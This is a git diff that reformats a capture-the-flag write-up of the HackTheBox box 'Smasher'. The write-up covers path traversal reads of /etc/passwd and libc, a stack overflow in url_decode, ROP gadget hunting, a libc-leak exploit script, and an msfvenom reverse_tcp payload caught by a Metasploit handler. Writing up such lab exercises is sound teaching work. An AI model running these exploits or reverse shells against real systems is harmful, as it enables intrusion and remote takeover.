@@ -16,63 +16,68 @@ I was immediately hooked by the idea of setting a web challenge as an entry gate
 
 Quick scan with nmap revealed following:
 ```bash	
-	[badarg:~/ctf/hackthebox/box/Smasher]$ nmap -sC -sV 10.10.10.89
-	Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-01 10:28 CEST
-	Nmap scan report for 10.10.10.89
-	Host is up (0.039s latency).
-	Not shown: 998 closed ports
-	PORT     STATE SERVICE         VERSION
-	22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-	| ssh-hostkey:
-	|   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)
-	|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)
-	|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)
-	1111/tcp open  lmsocialserver?
-	| fingerprint-strings:
-	|   FourOhFourRequest, GenericLines, SIPOptions:
-	|     HTTP/1.1 404 Not found
-	|     Server: shenfeng tiny-web-server
-	|     Content-length: 14
-	|     File not found
-	|   GetRequest, HTTPOptions, RTSPRequest:
-	|     HTTP/1.1 200 OK
-	|     Server: shenfeng tiny-web-server
-	|     Content-Type: text/html
-	|     <html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
-	|     <tr><td><a href="index.html">index.html</a></td><td>2018-03-31 00:57</td><td>2.1K</td></tr>
-	|_    </table></body></html>
-	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-	...
-	
-	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-	Nmap done: 1 IP address (1 host up) scanned in 124.22 seconds
-	
+
+[badarg:~/ctf/hackthebox/box/Smasher]$ nmap -sC -sV 10.10.10.89
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-01 10:28 CEST
+Nmap scan report for 10.10.10.89
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)
+|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)
+|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)
+1111/tcp open  lmsocialserver?
+| fingerprint-strings:
+|   FourOhFourRequest, GenericLines, SIPOptions:
+|     HTTP/1.1 404 Not found
+|     Server: shenfeng tiny-web-server
+|     Content-length: 14
+|     File not found
+|   GetRequest, HTTPOptions, RTSPRequest:
+|     HTTP/1.1 200 OK
+|     Server: shenfeng tiny-web-server
+|     Content-Type: text/html
+|     <html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
+|     <tr><td><a href="index.html">index.html</a></td><td>2018-03-31 00:57</td><td>2.1K</td></tr>
+|_    </table></body></html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+...
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 124.22 seconds
+```
+
 There are SSH and HTTP servers running on this box. HTTP server name(lmsocialserver?)(Server: shenfeng tiny-web-server) doesn't look familiar.
 Let's see what it does, and check headers.
 
-	[badarg:~/ctf/hackthebox/box/Smasher]$ curl -v http://10.10.10.89:1111/
-	*   Trying 10.10.10.89...
-	* TCP_NODELAY set
-	* Connected to 10.10.10.89 (10.10.10.89) port 1111 (#0)
-	> GET / HTTP/1.1
-	> Host: 10.10.10.89:1111
-	> User-Agent: curl/7.54.0
-	> Accept: */*
-	>
-	< HTTP/1.1 200 OK
-	< Server: shenfeng tiny-web-server
-	< Content-Type: text/html
-	* no chunk, no close, no size. Assume close to signal end
-	<
-	<html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
-	<tr><td><a href="index.html">index.html</a></td><td>2018-03-31 00:57</td><td>2.1K</td></tr>
-	* Closing connection 0
-	</table></body></html>%
+```sh
+
+[badarg:~/ctf/hackthebox/box/Smasher]$ curl -v http://10.10.10.89:1111/
+*   Trying 10.10.10.89...
+* TCP_NODELAY set
+* Connected to 10.10.10.89 (10.10.10.89) port 1111 (#0)
+> GET / HTTP/1.1
+> Host: 10.10.10.89:1111
+> User-Agent: curl/7.54.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Server: shenfeng tiny-web-server
+< Content-Type: text/html
+* no chunk, no close, no size. Assume close to signal end
+<
+<html><head><style>body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}</style></head><body><table>
+<tr><td><a href="index.html">index.html</a></td><td>2018-03-31 00:57</td><td>2.1K</td></tr>
+* Closing connection 0
+</table></body></html>%
 ```
 
 Looks like the web server returns a file listing, which shows that there's only one file available in that dir, and it's index.html.
 
 ```html
+
 <form method="post" action="index.php">
 <div class="box">
 <h1>Dashboard</h1>
@@ -91,53 +96,56 @@ Looks like the web server returns a file listing, which shows that there's only 
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
 ```
 
-Looks like a dead end with fake login form. Form action posts data to index.php, which doesn't exist on server. So, we have to look somewhere else.
+Looks like a dead end with a fake login form. Form action posts data to index.php, which doesn't exist on server. So, we have to look somewhere else.
 
 Few minutes of checking around with gobuster gave me interesting insight by hitting points like //..////../etc/, i found this interesting
 
 ```bash
-	[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//etc/passwd
-	root:x:0:0:root:/root:/bin/bash
-	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-	bin:x:2:2:bin:/bin:/usr/sbin/nologin
-	sys:x:3:3:sys:/dev:/usr/sbin/nologin
-	sync:x:4:65534:sync:/bin:/bin/sync
-	games:x:5:60:games:/usr/games:/usr/sbin/nologin
-	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-	systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-	systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-	systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-	systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-	syslog:x:104:108::/home/syslog:/bin/false
-	_apt:x:105:65534::/nonexistent:/bin/false
-	messagebus:x:106:110::/var/run/dbus:/bin/false
-	uuidd:x:107:111::/run/uuidd:/bin/false
-	sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
-	www:x:1000:1000:www,,,:/home/www:/bin/bash
-	smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
-```	
-Looks like we have Path Traversal vulnerability in servers code. Nice, but what can we do with it?
+
+[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+www:x:1000:1000:www,,,:/home/www:/bin/bash
+smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
+```
+
+This is Path Traversal vulnerability in servers code. Nice, but what can we do with it?
 I'll cut all my failed searches and ideas, in the end i found actual http server code and binary (Yaaay!)
 
 ```bash
-	[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//home/www/tiny-web-server/ | sed -e 's/<[^>]*>//g'
-	.git/2018-03-31 00:57[DIR]
-	public_html/2018-03-31 00:57[DIR]
-	tiny.c2018-03-31 00:5713.2K
-	README.md2018-03-31 00:571.0K
-	tiny2018-03-31 00:5744.4K
-	Makefile2018-03-31 00:57175
+
+[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//home/www/tiny-web-server/ | sed -e 's/<[^>]*>//g'
+.git/2018-03-31 00:57[DIR]
+public_html/2018-03-31 00:57[DIR]
+tiny.c2018-03-31 00:5713.2K
+README.md2018-03-31 00:571.0K
+tiny2018-03-31 00:5744.4K
+Makefile2018-03-31 00:57175
 ```
 
 Downloaded all of them. Great thing is that we have actual source code, which will speed up the whole process. Next i wanted to see, because i knew what my target was, is ASLR on the server enabled, and what can i do about it?
@@ -145,51 +153,58 @@ Downloaded all of them. Great thing is that we have actual source code, which wi
 First, i've checked version of the system:
 
 ```sh
-	[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//etc/issue
-	Ubuntu 16.04.4 LTS \n \l
+
+[badarg:~/ctf/hackthebox/box/Smasher]$ curl http://10.10.10.89:1111//etc/issue
+Ubuntu 16.04.4 LTS \n \l
 ```
 
 After that i tried to read /proc/sys/kernel/randomize_va_space, and for some reason ( permissions) i couldn't read that file.
 So i assumed the worst, and tried to get libc.so.6 so i can use it later.
 
-```sh	
-	wget http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so.6
+```sh
+
+wget http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so.6
 ```
 
 So, now, what i usually like to do is, identify version of libc, in this case i've had access to /etc/issue so i already know, i procceded futher to get docker container with radare2, ropper, pwndbg and libc-database, and few other tools, up and running on Ubuntu 16.04 x64.
 Let's start analysing tiny file, which is the binary for web server.
 
 ```sh
-	root@--name:/ctf/work$ file tiny
-	tiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, not stripped
-	
-	root@--name:/ctf/work$ ldd tiny
-	linux-vdso.so.1 =>  (0x00007ffc7b9a4000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f846ddf0000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f846e1ba000)
+
+root@--name:/ctf/work$ file tiny
+tiny: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b872377623aa9e081bc7d72c8dbe882f03bf66b7, not stripped
+
+root@--name:/ctf/work$ ldd tiny
+linux-vdso.so.1 =>  (0x00007ffc7b9a4000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f846ddf0000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f846e1ba000)
 ```
 
 Not stripped, huray.
 
 I've checked strings, as usual, but didn't saw nothing specialy useful. Except maybe this one:
 ```sh
-	GNU C99 5.4.0 20160609 -mtune=generic -march=x86-64 -g -O2 -std=c99 -fno-stack-protector
+
+GNU C99 5.4.0 20160609 -mtune=generic -march=x86-64 -g -O2 -std=c99 -fno-stack-protector
 ```
+
 NX is disabled, if you are to belive this one -fno-stack-protector, so i checked.
+
 ```sh
-	root@--name:/ctf/work# gdb -q tiny
-	Reading symbols from tiny...done.
-	pwndbg> checksec
-	[*] '/ctf/work/tiny'
-	    Arch:     amd64-64-little
-	    RELRO:    Partial RELRO
-	    Stack:    No canary found
-	    NX:       NX disabled
-	    PIE:      No PIE (0x400000)
-	    RWX:      Has RWX segments
-	    FORTIFY:  Enabled
-	
-	pwndbg> 
+
+root@--name:/ctf/work# gdb -q tiny
+Reading symbols from tiny...done.
+pwndbg> checksec
+[*] '/ctf/work/tiny'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+    FORTIFY:  Enabled
+
+pwndbg> 
 ```
 
 Yup, looks like only ASLR is enabled.
@@ -219,7 +234,7 @@ url_decode(filename, req->filename, MAXLINE);
  You can see that uri[0] doesn't have any real check for directory lookup
 ```c 
 
- if(uri[0] == '/'){
+if(uri[0] == '/'){
     filename = uri + 1;
     int length = strlen(filename);
 ```
@@ -227,54 +242,60 @@ url_decode(filename, req->filename, MAXLINE);
 After filename gets sorted here, it is passed to url_decode(), which is a simple little method:
 
 ```c
-	void url_decode(char* src, char* dest, int max) {
-	char *p = src;
-	char code[3] = { 0 };
-	while(*p && --max) {
-	    if(*p == '%') {
-	        memcpy(code, ++p, 2);
-	        *dest++ = (char)strtoul(code, NULL, 16);
-	        p += 2;
-	    } else {
-	        *dest++ = *p++;
-	    }
-	}
-	*dest = '\0';
-	}
+
+void url_decode(char* src, char* dest, int max) {
+char *p = src;
+char code[3] = { 0 };
+while(*p && --max) {
+    if(*p == '%') {
+        memcpy(code, ++p, 2);
+        *dest++ = (char)strtoul(code, NULL, 16);
+        p += 2;
+    } else {
+        *dest++ = *p++;
+    }
+}
+*dest = '\0';
+}
 ```
 
 Function does take 3 args a pointer to a source location buffer, a destination location buffer, and a max size to read.
 
 ```c
-	void url_decode(char* src, char* dest, int max)
+
+void url_decode(char* src, char* dest, int max)
 ```
 
  What's the deal with this? Let's see. This is how function is called from process_request() function:
  
 ```c
+
 url_decode(filename, req->filename, MAXLINE);
 ```
 
 filename = is a pointer to buffer defined here:
  
 ```c
+
 char buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
 ```
 
 So filename is a buffer of MAXLINE size, which is: 
  
 ```c
+
 #define MAXLINE 1024   /* max length of a line */
 ```
 
 That's a first argument, and it's a source argument which get's copied into second argument. That argument is req->filename, which is a buffer inside struct named http_request:
 
 ```c
-	typedef struct {
-	    char filename[512];
-	    off_t offset;              /* for support Range */
-	    size_t end;
-	} http_request;
+
+typedef struct {
+    char filename[512];
+    off_t offset;              /* for support Range */
+    size_t end;
+} http_request;
 
 ```
 
@@ -374,6 +395,7 @@ We have overwritten RIP with our 0x424242424242 bytes.
 To find gadgets, i've used ropper ( [Ropper @ github](https://github.com/sashs/Ropper) ), you can use whatever you want. 
 Lets's find out which gadgets can we find inside tiny binary.
 ```sh
+
 root@--name:/ctf/work# ropper --file tiny --search "% ?di; ret"
 [INFO] Load gadgets from cache
 [LOAD] loading... 100%
@@ -388,6 +410,7 @@ In tiny i found only pop RDI; ret. And we need pop RDI; pop RSI; ret. So we have
 Next on the list is pop RSI, and i find one which pops RSI, then pop R15 and returns. That's good enough, since we are gona put some trash in R15 because we don't need it.
 
 ```sh
+
 root@--name:/ctf/work# ropper --file tiny --search "pop ?si"
 [INFO] Load gadgets from cache
 [LOAD] loading... 100%
@@ -402,6 +425,7 @@ root@--name:/ctf/work# ropper --file tiny --search "pop ?si"
 Last one, push RSP, which we need for last stage of exploit, we are going to look for inside libc.so.6 which is downloaded from the server, because i couln't find one in tiny binary. <br />
 <b>Note</b>: we will find offset to it, which needs to be added to libc base address later.
 ```sh
+
 root@--name:/ctf/work# ropper --file libc.so.6 --search "push rsp"
 [INFO] Load gadgets from cache
 [LOAD] loading... 100%
@@ -436,13 +460,15 @@ We can see address of write@plt if we disassemble process function. There's a ca
 That's done, now on to read@GOT.
 
 ```sh
+
 root@--name:/ctf/work# objdump -R tiny | grep read
 0000000000603088 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
 ```
 
 And lastly we need read() offset from libc.
 
-```sh		
+```sh
+
 root@--name:/ctf/work# readelf -s libc.so.6 | grep read@
 ....
 891: 00000000000f7250    90 FUNC    WEAK   DEFAULT   13 read@@GLIBC_2.2.5
@@ -451,6 +477,7 @@ root@--name:/ctf/work# readelf -s libc.so.6 | grep read@
 Let's write that down, so far we have:
 
 ```python
+
 # padding to RIP
 padding = "A" * 568
 
@@ -470,6 +497,7 @@ push_rsp  = 0x023ad1 # push rsp; ret
 Ok, time for first stage. Let's try to leak address of read() and substract read_off (offset) to get libc base address.
 
 ```python
+
 import httplib
 import struct
 import socket
@@ -521,6 +549,7 @@ print "libc base is at", hex(libc_addr)
 
 Fire up GDB again, and rerun the tiny in the same way. Set breakpoint, and hit r.
 ```sh
+
 root@--name:/ctf/work# gdb -q tiny
 Reading symbols from tiny...done.
 pwndbg> b *0x000000000040178b
@@ -531,7 +560,8 @@ warning: Error disabling address space randomization: Operation not permitted
 listen on port 9999, fd is 3
 ```
 Go open another tab or something and run our script:
-```
+```sh
+
 root@--name:/ctf/work# python stage1.py 
 read() is at 0x7fa328ae2250
 libc base is at 0x7fa3289eb000
@@ -539,12 +569,13 @@ libc base is at 0x7fa3289eb000
 Nice, so let's confirm that this indeed works. We are going to look and disassemble 0x7fa328ae2250 which is suposed to be address of read() function.
 
 ```sh
-	pwndbg> disassemble 0x7fa328ae2250
-	Dump of assembler code for function read:
-	   0x00007fa328ae2250 <+0>:	cmp    DWORD PTR [rip+0x2d24e9],0x0        # 0x7fa328db4740 <__libc_multiple_threads>
-	   0x00007fa328ae2257 <+7>:	jne    0x7fa328ae2269 <read+25>
-	   0x00007fa328ae2259 <+0>:	mov    eax,0x0
-	   ....
+
+pwndbg> disassemble 0x7fa328ae2250
+Dump of assembler code for function read:
+   0x00007fa328ae2250 <+0>:	cmp    DWORD PTR [rip+0x2d24e9],0x0        # 0x7fa328db4740 <__libc_multiple_threads>
+   0x00007fa328ae2257 <+7>:	jne    0x7fa328ae2269 <read+25>
+   0x00007fa328ae2259 <+0>:	mov    eax,0x0
+   ....
 ```
 
 And it indeed is. We successfuly leaked address of read, and thus are able to calculate base of the libc ( you can play out, and test this by adding offsets to other functions/calls and check if they match).
@@ -554,6 +585,7 @@ Allright, now let's wrap up this. Since we now can tell where push RSP will be, 
 For sake of simplicity, i'm going to use msfvenom to generate reverse_tcp shellcode for x64, and use handler to connected back to it.
 
 ```sh
+
 [badarg:/opt/metasploit-framework/bin]$ ./msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.13.238 LPORT=4444  --bad-chars "\x00" -f python                                                        
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -673,6 +705,7 @@ response = exploit(buf)
 
 Before running, remmember to start handler.
 ```sh
+
 msf > use multi/handler
 msf exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp
 payload => linux/x64/shell/reverse_tcp
@@ -686,6 +719,7 @@ msf exploit(multi/handler) > run
 And run exploit!
 
 ```sh
+
 [badarg:~/ctf/hackthebox/box/Smasher]$ python smasher_reverse_tcp.py 
 	read() is at 0x7fd2fce03250
 	libc base is at 0x7fd2fcd0c000
@@ -693,7 +727,8 @@ And run exploit!
 
 If you check your multi handler, you will see new session
 
-```sh	
+```sh
+
 [*] Sending stage (38 bytes) to 10.10.10.89
 [*] Command shell session 1 opened (10.10.13.238:4444 -> 10.10.10.89:36424) at 2018-10-01 18:07:20 +0200
 ```
@@ -703,6 +738,7 @@ If you check your multi handler, you will see new session
 That's it. Now tha you have a shell it's time to move onto a second stage, which is fighting this guy
 
 ```sh
+
 ps aux | grep crackme.py
 smasher    714  0.0  0.1  24364  1784 ?        S    16:52   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py
 
